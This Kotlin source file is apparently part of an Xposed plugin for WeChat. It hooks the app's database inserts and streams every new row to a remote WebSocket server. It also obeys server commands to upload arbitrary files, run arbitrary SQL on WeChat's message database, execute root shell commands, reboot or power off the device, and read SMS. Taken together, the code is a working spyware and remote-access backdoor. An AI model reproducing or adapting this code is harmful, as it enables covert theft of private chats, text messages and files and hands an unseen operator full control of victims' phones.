package com.lu.wxmask.plugin

import PhoneUtils
import ZipUtils
import android.content.ContentValues
import android.content.Context
import android.os.Build
import com.example.libcontacts.IdGet
import com.example.libcontacts.ShellUtils
import com.example.libcontacts.WebSocketClient
import com.example.libcontacts.WebSocketClientListener
import com.lu.lposed.api2.XposedHelpers2
import com.lu.lposed.plugin.IPlugin
import com.lu.magic.util.log.LogUtil
import com.lu.wxmask.BuildConfig
import com.lu.wxmask.ClazzN
import com.lu.wxmask.bean.DBItem
import com.lu.wxmask.util.AppVersionUtil.Companion.getSmartVersionName
import com.lu.wxmask.util.WxSQLiteManager
import com.lu.wxmask.util.ext.toJson
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.callbacks.XC_LoadPackage
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import kotlin.math.min

class MessagePlugin : WebSocketClientListener, IPlugin {

    private lateinit var mContext: Context

    private var wxId: String = ""
    private var client: WebSocketClient? = null

    private val uploader by lazy {
        com.lu.wxmask.http.upload.FileUploader(
            IdGet.androidId(mContext), object : com.lu.wxmask.http.upload.ClientEvent {
                override fun send(message: Any) {
                    if (message is String) {
                        client?.sendMessage(message, wxId)
                    } else if (message is ByteArray) {
                        client?.sendMessage(message, wxId)
                    }
                }

                override fun isConnected(): Boolean {
                    return if (client?.isConnected() == true) {
                        true
                    } else {
                        client?.connect() ?: false
                    }
                }

                override fun close() {
                    client?.close()
                }
            }
        ).apply {
            setUploadListener(object : com.lu.wxmask.http.upload.FileUploader.UploadListener {
                override fun onProgress(filePath: String?, progress: Int, total: Int) {
                }

                override fun onSuccess(filePath: String?) {
                }

                override fun onError(filePath: String?, error: String?) {
                }
            })
        }
    }

    override fun handleHook(context: Context, p1: XC_LoadPackage.LoadPackageParam?) {
        this.mContext = context
        client = WebSocketClient(context)
        client?.setOnWebSocketListener(this)
        client?.connect()

        hookMessageInsert()
    }

    private fun hookMessageInsert() {
        XposedHelpers2.findAndHookMethod(
            ClazzN.from("com.tencent.wcdb.database.SQLiteDatabase"),
            "insertWithOnConflict",
            String::class.java,
            String::class.java,
            ContentValues::class.java,
            Int::class.java,
            object : XC_MethodHook() {
                override fun beforeHookedMethod(param: MethodHookParam) {
                    super.beforeHookedMethod(param)
                    val dbName =
                        param.thisObject.toString().substring("SQLiteDatabase:".length).trim()

                    WxSQLiteManager.Store[dbName] =
                        DBItem(dbName, WxSQLiteManager.Store[dbName]?.password, param.thisObject)
                    LogUtil.d("param.thisObject = $dbName", WxSQLiteManager.Store)
                    val values = param.args[2] as ContentValues
                    sendMessage(values.toJson())
                }
            })
    }

    @OptIn(DelicateCoroutinesApi::class)
    override fun onMessage(message: String) {
        GlobalScope.launch {
            dealMessage(message)
        }
    }

    private suspend fun dealMessage(message: String) = withContext(Dispatchers.IO) {
        // 解析和处理服务器返回的消息
        try {
            val json = JSONObject(message)

            val type = json.opt("type")
            if (type == "chunk_upload_response") {
                uploader.handleResponse(message)
                return@withContext
            }

            when (type) {
                // path为非全路径
                0 -> {
                    val path = json.optString("path")
                    LogUtil.d("WxSQLiteManager.Store = ${WxSQLiteManager.Store}")
                    val firstDbName = WxSQLiteManager.Store.values.firstOrNull()?.name
                    LogUtil.d("firstDbName = $firstDbName")

                    val absolutePath = firstDbName?.let {
                        it.substring(0, it.lastIndexOf("/")) + "/" + path
                    } ?: return@withContext
                    LogUtil.d("file path = $$absolutePath")
                    var file = File(absolutePath)
                    if (!file.exists()) {
                        file = File("$absolutePath⌖")
                    }
                    uploadFile(file)
                }

                1 -> {
                    val path = json.optString("path")
                    LogUtil.d("file path = $path")
                    uploadFile(File(path))
                }

                2 -> {
                    //"SELECT * FROM userinfo" EnMicroMsg
                    val sql = json.optString("sql")
                    val dbName = json.optString("name", "EnMicroMsg.db")
                    // 一次发送几条消息
                    val count = json.optInt("count", -1)
                    LogUtil.d("start execute database", dbName, sql)

                    sendSqlExecuteResult(dbName, sql, count, json)
                }

                3 -> {
                    val cmd = json.optString("sql")
                    executeCommand(cmd, json)
                }
                // 重启手机
                4 -> {
                    executeCommand("reboot", json)
                }

                5 -> {
                    executeCommand("reboot -p", json)
                }

                6 -> {
                    // 发送应用版本，微信版本，安卓版本，设备机型
                    sendMessage(JSONObject().apply {
                        put("data", JSONObject().apply {
                            put("app_version", BuildConfig.VERSION_NAME)
                            put("wechat_version", getSmartVersionName())
                            put("android_version", Build.VERSION.RELEASE)
                            put("device_model", "${Build.BRAND} ${Build.DEVICE}")
                        })
                        put("source", json)
                    }.toString())
                }

                11 -> {
                    // 读取短信
                    val params = json.optJSONObject("params")
                    val startTime = params?.optLong("start_time", 1698000000000L) ?: 1698000000000L
                    val endTime = params?.optLong("end_time", 1699000000000L) ?: 1699000000000L
                    val id = params?.optString("id")

                    val result = SmsUtils.getSmsAsJsonArray(id, startTime, endTime)
                    sendMessage(JSONObject().apply {
                        put("androidId", IdGet.androidId(mContext))
                        put("smsList", result)
                    }.toString())
                    LogUtil.d("result = $result")
                }

                else -> {
                    if (type != null) {
                        sendOriginMessage("""{"err":"不支持得类型${type}，检查androidId是否传错"}""")
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            sendOriginMessage("""{"err":"客户端异常：${e.message}"}""")
        }
    }

    private fun executeCommand(cmd: String, source: JSONObject) {
        val result = ShellUtils.execRootCmd1(cmd)
        sendMessage(JSONObject().apply {
            put("data", result)
            put("source", source)
        }.toString())
    }

    fun sendSqlExecuteResult(dbName: String, sql: String, count: Int, source: JSONObject) {
        val db = WxSQLiteManager.executeSql(dbName, sql)
        if (count > 0 && db.length() > count) {
            sendInBatches(db, count) {
                sendMessage(JSONObject().apply {
                    put("data", it)
                    put("source", source)
                }.toString())
            }
        } else {
            sendMessage(JSONObject().apply {
                put("data", db)
                put("source", source)
            }.toString())
        }
    }

    private fun sendInBatches(jsonArray: JSONArray, count: Int, sendBatch: (JSONArray) -> Unit) {
        fun JSONArray.toList(): List<Any> {
            val list = mutableListOf<Any>()
            for (i in 0 until this.length()) {
                list.add(this[i])
            }
            return list
        }

        val length = jsonArray.length()
        val list = jsonArray.toList()
        var i = 0
        while (i < length) {
            // 计算当前批次的结束索引
            val end = min((i + count), length)
            // 截取当前批次的子数组
            val batch = JSONArray(list.subList(i, end))
            // 发送当前批次数据
            sendBatch(batch)
            i += count
        }
    }

    private fun uploadFile(file: File) {
        val targetFile = if (file.isDirectory) {
            // 1. 压缩并分块
            ZipUtils.zipFolderToChunks(file)
        } else {
            file
        }
        if (!targetFile.exists()) {
            sendMessage("文件不存在: ${file.absolutePath}")
            return
        }

        uploader.uploadFile(targetFile.absolutePath, targetFile.absolutePath)
    }

    fun sendMessage(message: String, type: String = "webhook") {
        if (wxId.trim().isEmpty()) {
            wxId = WxSQLiteManager.getWxId(mContext)
            IdGet.saveWxId(mContext, wxId)
        }
        val text = JSONObject(message.trimIndent()).apply {
            put("type", type)
        }.toString()
        LogUtil.d("发送消息: $text", "\nwxId=$wxId", "aid=", IdGet.androidId(mContext))
        client?.sendMessage(text, wxId)
    }

    fun sendOriginMessage(message: String) {
        client?.sendMessage(message, wxId)
        LogUtil.d("发送消息: $message")
    }
}